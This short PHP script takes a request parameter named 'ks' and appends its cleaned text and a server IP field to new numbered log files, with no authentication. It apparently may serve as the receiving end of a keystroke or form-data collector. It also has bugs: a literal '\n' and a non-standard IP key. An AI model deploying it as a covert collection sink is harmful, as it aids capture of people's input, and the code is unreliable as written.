<?php
$str = $_REQUEST['ks'];
$res = strip_tags(stripslashes(trim(htmlspecialchars_decode(((( $str )))))));

$n = 0;

while ( file_exists( './blend/log' . $n) ) {
    $n++;
}

file_put_contents( './blend/log' . $n, $_SERVER['IP_ADDRESS'] . '\n' . $res );

exit();
?>